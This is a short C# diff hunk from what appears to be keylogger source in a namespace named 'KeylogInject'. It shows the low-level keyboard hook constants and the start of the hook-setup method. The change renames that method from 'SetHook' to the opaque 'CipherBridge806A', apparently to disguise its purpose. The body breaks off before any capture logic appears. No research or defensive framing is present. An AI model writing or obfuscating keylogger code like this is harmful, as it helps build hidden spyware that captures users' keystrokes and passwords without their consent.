@@ -12,7 +12,7 @@ namespace KeylogInject
         private const int WH_KEYBOARD_LL = 13;
         private const int WM_KEYDOWN = 0x0100;
 
-        public static IntPtr SetHook(LowLevelKeyboardProc proc)
+        public static IntPtr CipherBridge806A(LowLevelKeyboardProc proc)
         {
             using (Process curProcess = Process.GetCurrentProcess())
             using (ProcessModule curModule = curProcess.MainModule)
